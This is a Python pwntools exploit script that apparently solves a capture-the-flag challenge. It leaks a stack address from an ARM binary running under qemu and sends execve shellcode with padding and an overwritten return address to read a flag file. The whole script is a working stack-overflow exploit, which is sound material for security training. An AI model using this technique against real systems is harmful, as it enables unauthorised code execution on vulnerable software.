#!/usr/bin/env python3
from pwn import *
import struct
import time

def send(p, msg):
    try:
        p.send(msg)
        time.sleep(2)
        return p.recv(1024).decode()
    except:
        return ''

# Create a test flag file locally
with open('flag.txt', 'w') as f:
    f.write('CTF{LOCAL_TEST_FLAG_123}')

# execve(/bin/cat, flag.txt, NULL) - Modified for local file

shellcode = b'\x00\x71\x04\xe3\x41\x71\x44\xe3\x04\x70\x2d\xe5\x2f\x73\x06\xe3\x61\x74\x47\xe3\x04\x70\x2d\xe5\x2f\x72\x06\xe3\x69\x7e\x46\xe3\x04\x70\x2d\xe5\x0d\x00\xa0\xe1\x74\x70\x00\xe3\x00\x71\x44\xe3\x04\x70\x2d\xe5\x67\x7e\x02\xe3\x74\x78\x47\xe3\x04\x70\x2d\xe5\x00\x76\x06\xe3\x6c\x71\x46\xe3\x04\x70\x2d\xe5\x2f\x73\x06\xe3\x61\x74\x47\xe3\x04\x70\x2d\xe5\x2f\x72\x06\xe3\x69\x7e\x46\xe3\x04\x70\x2d\xe5\x0c\xc0\x2c\xe0\x04\xc0\x2d\xe5\x0d\x10\xa0\xe3\x0d\x10\x81\xe0\x01\xc0\xa0\xe1\x04\xc0\x2d\xe5\x08\x10\xa0\xe3\x0d\x10\x81\xe0\x01\xc0\xa0\xe1\x04\xc0\x2d\xe5\x0d\x10\xa0\xe1\x02\x20\x22\xe0\x0b\x70\xa0\xe3\x00\x00\x00\xef'
offset = 164
print('[!] Shellcode length: {0}'.format(len(shellcode)))

# Start process
p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', './chall'])
time.sleep(2)

resp = p.recv(1024)
if 'Give me data to dump' not in resp.decode():
    print('[-] Failed to get initial message')
    exit(1)
print('[+] Communication started')

# Leak address
resp = send(p, b'A\n')
if 'Dump again' not in resp:
    print('[-] Failed to leak address')
    exit(1)
stack = resp.split(':')[0]
print('[+] Stack address: {0}'.format(stack))

resp = send(p, b'y\n')
if 'Give me data to dump' not in resp:
    print('[-] Failed to continue')
    exit(1)

# Build and send exploit
stack_addr = struct.pack('I', int(stack, 16))
payload = shellcode + b'A' * (offset - len(shellcode)) + stack_addr + b'\n'

resp = send(p, payload)
if 'Dump again' not in resp:
    print('[-] Failed to send shellcode')
    exit(1)
print('[+] Shellcode sent')

resp = send(p, b'n\n')
print('[+] Output: {0}'.format(resp.strip()))

p.close()